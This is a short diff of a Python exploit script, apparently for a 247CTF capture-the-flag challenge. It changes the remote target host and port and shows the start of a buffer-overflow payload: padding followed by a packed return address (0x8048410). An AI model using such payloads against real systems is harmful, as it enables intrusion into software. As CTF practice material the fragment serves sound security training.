@@ -4,7 +4,7 @@ import TheNight
 
 import sys
 
-target = remote("6c1e79c5ca0b9cfb.247ctf.com", 50270)
+target = remote("e9685e1ae56237d3.247ctf.com", 50247)
 payload = ""
 payload += "0000000000000000000000000000000000000000000000000000000000000000000000000000"
 payload += p32(0x8048410)
